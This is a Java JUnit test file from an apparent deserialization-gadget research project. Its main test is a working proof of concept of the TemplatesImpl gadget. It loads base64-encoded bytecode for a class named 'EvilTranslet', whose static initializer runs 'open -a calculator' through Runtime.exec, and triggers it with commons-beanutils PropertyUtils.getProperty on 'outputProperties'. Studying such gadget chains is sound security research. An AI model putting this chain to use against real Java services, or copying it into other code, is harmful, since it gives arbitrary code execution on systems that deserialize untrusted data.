package com.trganda.gadget.templateimpl;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.trganda.gadget.utils.Reflections;

import org.apache.commons.beanutils.PropertyUtils;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.map.DefaultedMap;
import org.junit.Test;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.lang.reflect.InvocationTargetException;
import java.util.Base64;
import java.util.HashMap;

public class PropertyUtilsBeanTest {
    @Test
    public void getPropertyTest() throws Exception {
        TemplatesImpl templatesImpl = new TemplatesImpl();

        Reflections.setFieldValue(templatesImpl, "_name", "evil");
        Reflections.setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        byte[] code =
                Base64.getDecoder()
                        .decode(
                                "yv66vgAAADQAKQoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACkV4Y2VwdGlvbnMHACIBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlBwAdAQAKU291cmNlRmlsZQEAEUV2aWxUcmFuc2xldC5qYXZhDAAKAAsHACMMACQAJQEAEm9wZW4gLWEgY2FsY3VsYXRvcgwAJgAnAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACgBAAxFdmlsVHJhbnNsZXQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAABAABAAoACwABAAwAAAAdAAEAAQAAAAUqtwABsQAAAAEADQAAAAYAAQAAAAkAAQAOAA8AAgAMAAAAGQAAAAMAAAABsQAAAAEADQAAAAYAAQAAABUAEAAAAAQAAQARAAEADgASAAIADAAAABkAAAAEAAAAAbEAAAABAA0AAAAGAAEAAAAaABAAAAAEAAEAEQAIABMACwABAAwAAABUAAMAAQAAABe4AAISA7YABFenAA1LuwAGWSq3AAe/sQABAAAACQAMAAUAAgANAAAAFgAFAAAADAAJAA8ADAANAA0ADgAWABAAFAAAAAcAAkwHABUJAAEAFgAAAAIAFw==");
        Reflections.setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});

        PropertyUtils.getProperty(templatesImpl, "outputProperties");
        // 使用 _outputProperties 不会触发 getOutputProperties 方法
        // PropertyUtils.getProperty(templatesImpl, "_outputProperties");
    }

    @Test
    public void beanDemoTest() throws InvocationTargetException, IllegalAccessException, NoSuchMethodException {
        BeanDemo beanDemo = new BeanDemo();
        PropertyUtils.getProperty(beanDemo, "_outputProperties");
    }

    @Test
    public void beanDemo2Test() {
        ScriptEngineManager sem = new ScriptEngineManager();
        ScriptEngine engine = sem.getEngineByName("javascript");
        System.out.println(1);
    }
}
